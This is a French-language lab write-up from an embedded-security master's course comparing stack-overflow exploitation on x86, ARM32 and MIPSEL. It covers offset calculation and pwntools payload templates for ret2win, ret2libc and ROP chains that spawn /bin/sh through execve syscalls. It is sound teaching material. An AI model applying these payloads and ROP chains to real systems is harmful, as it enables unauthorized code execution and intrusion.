# Write-up — Comparatif x86 / ARM / MIPS

> **Embedded Security — Consolidation finale**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

![x86](https://img.shields.io/badge/arch-x86-blue.svg)
![ARM](https://img.shields.io/badge/arch-ARM32-green.svg)
![MIPS](https://img.shields.io/badge/arch-MIPSEL-purple.svg)
![Labs](https://img.shields.io/badge/labs-01--23-orange.svg)

---

## 1. Vue d'ensemble

Ce document synthétise 23 labs d'exploitation sur 3 architectures différentes.
L'objectif : comprendre ce qui est **universel** et ce qui est **spécifique** à chaque ISA.

```
x86    → Labs 01–13
ARM32  → Labs 18–20
MIPSEL → Labs 21–23
```

**Conclusion principale :** les techniques sont les mêmes. Seule la syntaxe change.

---

## 2. Registres — tableau comparatif

| Rôle | x86-32 | x86-64 | ARM32 | MIPSEL |
|---|---|---|---|---|
| Registre retour | `EIP` (instruction pointer) | `RIP` | `LR` (R14) | `$ra` ($31) |
| Stack pointer | `ESP` | `RSP` | `SP` (R13) | `$sp` ($29) |
| Frame pointer | `EBP` | `RBP` | `R7` / `R11` | `$s8` / `$fp` |
| Retour valeur | `EAX` | `RAX` | `R0` | `$v0` |
| Args 1-4 | stack | RDI/RSI/RDX/RCX | R0/R1/R2/R3 | $a0/$a1/$a2/$a3 |
| Numéro syscall | `EAX` | `RAX` | `R7` | `$v0` |

---

## 3. Calling conventions

### x86-32 — cdecl
```c
// Arguments passés sur la stack (droite → gauche)
// Caller nettoie la stack
// Retour dans EAX
push arg2
push arg1
call function
add esp, 8    // cleanup
```

### ARM32 — AAPCS
```asm
// 4 premiers args dans R0-R3, reste sur stack
// LR = adresse de retour (Link Register)
// pop {pc} = retour (charge LR dans PC)
push {r4, r7, lr}   // sauvegarde LR
...
pop  {r4, r7, pc}   // restaure LR dans PC → retour
```

### MIPSEL — O32 ABI
```asm
// 4 premiers args dans $a0-$a3
// $ra = adresse de retour (Return Address)
// Zone arg (16 bytes) réservée sur stack même si pas utilisée
addiu $sp, $sp, -96
sw    $ra, 92($sp)   // sauvegarde $ra
sw    $gp, 16($sp)   // sauvegarde $gp (quirk O32)
...
lw    $ra, 92($sp)
jr    $ra             // retour
```

---

## 4. Stack overflow — mécanique universelle

Dans les 3 architectures, l'exploit suit toujours le même schéma :

```
[  padding  ][  adresse cible  ]
     ↑               ↑
  écrase buffer   écrase registre de retour
```

| Architecture | Registre cible | Sauvegardé où |
|---|---|---|
| x86-32 | `EIP` (saved return addr) | `[ebp+4]` |
| ARM32 | `LR` → chargé dans `PC` | `[sp + N]` (via push) |
| MIPSEL | `$ra` | `[sp + 92]` (sw $ra, 92($sp)) |

---

## 5. Découverte de l'OFFSET

La méthode est identique dans les 3 architectures :

### Étape 1 — Lire le prologue de la fonction vulnérable

**x86 :**
```bash
objdump -d target | grep -A 20 "<vulnerable>:"
# push ebp           → 4 bytes
# sub esp, 0x40      → buffer = 64 bytes
# OFFSET = 64 + 4 = 68
```

**ARM32 :**
```bash
objdump -d target | grep -A 20 "<vulnerable>:"
# push {r7, lr}      → 8 bytes (r7 + lr)
# sub  sp, #64       → buffer = 64 bytes
# OFFSET = 64 + 4 (r7) = 68
```

**MIPSEL :**
```bash
mipsel-linux-gnu-objdump -d target | grep -A 20 "<vulnerable>:"
# addiu $sp, $sp, -96   → frame = 96 bytes
# sw    $ra, 92($sp)    → $ra à sp+92
# sw    $gp, 16($sp)    → buffer commence à sp+24
# OFFSET = 92 - 24 = 68
```

### Étape 2 — Confirmer avec cyclic

```python
from pwn import *
payload = cyclic(100)
# → SIGSEGV → cyclic_find(valeur) → OFFSET
```

**Résultat : OFFSET = 68 dans les 3 architectures** pour un buffer de 64 bytes.
Ce n'est pas une coïncidence — c'est la structure ABI qui détermine l'alignement.

---

## 6. Techniques d'exploitation — comparatif

### 6.1 ret2win

Objectif : écraser le registre de retour avec l'adresse d'une fonction `win()`.

| Architecture | Payload |
|---|---|
| x86-32 | `b'A' * OFFSET + p32(win_addr)` |
| ARM32 | `b'A' * OFFSET + p32(win_addr)` |
| MIPSEL | `b'A' * OFFSET + p32(win_addr)` |

**Identique dans les 3 cas.** La différence est dans l'endianness et la taille des pointeurs.

### 6.2 ROP chains

Objectif : enchaîner des gadgets pour construire un appel système.

**x86-32 (Lab10 — execve direct) :**
```python
# int 0x80 : EAX=11, EBX=&"/bin/sh", ECX=0, EDX=0
chain = p32(pop_eax) + p32(11) +
        p32(pop_ebx) + p32(binsh) +
        p32(pop_ecx_edx) + p32(0) + p32(0) +
        p32(int80)
```

**ARM32 (Lab20 — SVC #0) :**
```python
# SVC #0 : R7=11, R0=&"/bin/sh", R1=0, R2=0
chain = p32(pop_r7_pc)    + p32(11)     +
        p32(pop_r0_pc)    + p32(binsh)  +
        p32(pop_r1_r2_pc) + p32(0) + p32(0) +
        p32(do_svc)
```

**MIPSEL (Lab21 — syscall) :**
```asm
; gadget_li_a1a2_syscall :
;   li $a1, 0 / li $a2, 0 / li $v0, 4011 / syscall
; gadget_lw_a0_jr_ra :
;   lw $a0, 0($sp) / jr $ra / addiu $sp, $sp, 4
```

**Différences clés :**
- x86 : `int 0x80` (software interrupt)
- ARM32 : `SVC #0` (Supervisor Call), numéro dans R7
- MIPSEL : `syscall`, numéro dans `$v0` (4011 = execve en MIPS Linux)

### 6.3 ret2libc / ret2plt

**x86-32 (Lab05) :**
```python
payload = b'A' * OFFSET + p32(system_plt) + p32(0) + p32(binsh_addr)
```

**ARM32 (Lab19) :**
```python
# R0 = premier argument → pop_r0_pc gadget
chain = p32(pop_r0_pc) + p32(binsh_addr) + p32(system_plt)
payload = b'A' * OFFSET + chain
```

**MIPSEL :** ret2libc plus complexe à cause du branch delay slot et du $gp.
→ Préférer ret2win ou ret2syscall direct.

---

## 7. Quirks spécifiques à chaque architecture

### x86 — ce qui n'existe pas ailleurs
- **NX + ASLR + PIE + canary** : toutes les protections actives en même temps (Lab09)
- **Format string** : `%n` écrit en mémoire — exploitable en x86, comportement différent ARM/MIPS
- **mprotect ROP** : rendre la stack exécutable puis injecter shellcode (Lab11)
- **Heap UAF** : use-after-free via chunks malloc (x86 uniquement dans nos labs)

### ARM32 — ce qui n'existe pas ailleurs
- **Thumb mode** : instructions 16-bit, LSB=1 dans les adresses (`pop_r7_pc | 1`)
- **`.thumb_func`** : directive assembleur obligatoire pour gadgets Thumb
- **`pop {pc}`** : charge directement dans PC = retour de fonction + gadget ROP en un seul `pop`
- **SVC #0** : numéro syscall dans R7 (pas dans l'instruction elle-même comme x86)

### MIPSEL — ce qui n'existe pas ailleurs
- **Branch delay slot** : l'instruction après `jr $ra` s'exécute avant le saut
  ```asm
  jr  $ra
  nop        ← s'exécute en premier !
  ```
- **$ra loop** : `jr $ra` ne modifie pas `$ra` → `win()` retourne sur elle-même à l'infini
  - Fix : `p.recvline(timeout=3)` au lieu de `p.recvall()`
- **$gp save à sp+16** : O32 ABI réserve 16 bytes d'arg area + sauvegarde $gp → buffer commence à sp+24
- **No PIE par défaut** : adresses fixes sous QEMU user-mode → exploitation plus simple

---

## 8. Setup QEMU — comparatif

| Architecture | Commande QEMU | Cross-compiler |
|---|---|---|
| x86-32 | Natif Linux | `gcc -m32` |
| ARM32 | `qemu-arm -L /usr/arm-linux-gnueabihf ./target` | `arm-linux-gnueabihf-gcc` |
| MIPSEL | `qemu-mipsel -L /usr/mipsel-linux-gnu ./target` | `mipsel-linux-gnu-gcc` |

**GDB multiarch :**
```bash
# ARM
qemu-arm -g 1234 -L /usr/arm-linux-gnueabihf ./target &
gdb-multiarch -ex "set arch arm" -ex "target remote :1234" ./target

# MIPS
qemu-mipsel -g 1234 -L /usr/mipsel-linux-gnu ./target &
gdb-multiarch -ex "set arch mips" -ex "target remote :1234" ./target
```

---

## 9. Tableau récapitulatif des labs

### x86 (Labs 01–13)

| Lab | Technique | Difficulté |
|---|---|---|
| Lab01 | GDB, stack frame, segfault | ★☆☆ |
| Lab02 | Buffer overflow — EIP dans GDB | ★☆☆ |
| Lab03 | ret2win | ★☆☆ |
| Lab04 | Format string — %x leak | ★★☆ |
| Lab05 | ROP ret2libc | ★★☆ |
| Lab06 | ASLR bypass | ★★☆ |
| Lab07 | PIE bypass | ★★☆ |
| Lab08 | Stack canary bypass (format string leak) | ★★★ |
| Lab09 | Full combo NX+Canary+PIE+ASLR | ★★★ |
| Lab10 | ret2syscall execve direct | ★★★ |
| Lab11 | mprotect ROP + shellcode | ★★★ |
| Lab12 | Privilege escalation syscall chaining | ★★★ |
| Lab13 | Ghidra RE — XOR crackme | ★★☆ |

### ARM32 (Labs 18–20)

| Lab | Technique | Difficulté |
|---|---|---|
| Lab18 | ret2win — OFFSET=76 (push r4,r7,lr) | ★☆☆ |
| Lab19 | ROP system@plt — pop_r0_pc gadget | ★★☆ |
| Lab20 | ret2syscall SVC#0 — OFFSET=68, chain R7/R0/R1/R2 | ★★★ |

### MIPSEL (Labs 21–23)

| Lab | Technique | Difficulté |
|---|---|---|
| Lab21 | ret2win — OFFSET=68, $gp quirk, $ra loop | ★★☆ |
| Lab22 | Firmware IoT — binwalk, SquashFS, 3 flags | ★★☆ |
| Lab23 | httpd parse_auth() overflow — ret2win firmware | ★★☆ |

---

## 10. Ce qui est universel

Quelle que soit l'architecture, l'exploitation d'un stack overflow suit toujours :

```
1. Identifier la fonction vulnérable (gets, strcpy, read sans limite)
2. Lire le prologue → calculer l'OFFSET jusqu'au registre de retour
3. Confirmer avec cyclic pattern
4. Construire le payload : padding + adresse cible
5. Exécuter sous l'émulateur (QEMU) ou nativement
```

**Les outils changent. La méthode reste.**

| Étape | x86 | ARM | MIPS |
|---|---|---|---|
| Désassemblage | `objdump -d` | `objdump -d` | `mipsel-linux-gnu-objdump -d` |
| Debugger | `gdb` | `gdb-multiarch` | `gdb-multiarch` |
| Emulateur | natif | `qemu-arm` | `qemu-mipsel` |
| Endianness | little | little (ARM32) | little (MIPSEL) |
| Taille pointeur | 4 bytes | 4 bytes | 4 bytes |
| pwntools | `p32()` | `p32()` | `p32()` |

---

## 11. Leçons retenues

**1. Lire le prologue avant tout.**
`push {r7, lr}` ou `addiu $sp, $sp, -96` ou `push ebp` — c'est là que tout se calcule.

**2. L'OFFSET ne se devine pas, il se calcule.**
Objdump → prologue → position du buffer → position du registre de retour → soustraction.

**3. Les ABI créent des surprises.**
- MIPS O32 : 16 bytes d'arg area + $gp save → le buffer ne commence pas à sp+0
- ARM Thumb : LSB=1 obligatoire pour les gadgets Thumb
- x86 cdecl : le caller nettoie la stack (impact sur les ROP chains)

**4. QEMU user-mode = pas d'ASLR.**
Les adresses sont fixes → ret2win trivial. En conditions réelles, il faut un leak.

**5. Le $ra MIPS boucle.**
`jr $ra` ne modifie pas `$ra`. Si `win()` retourne, elle ré-exécute `jr $ra` → boucle infinie.
→ Toujours utiliser `recvline()` + `close()`, jamais `recvall()`.

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
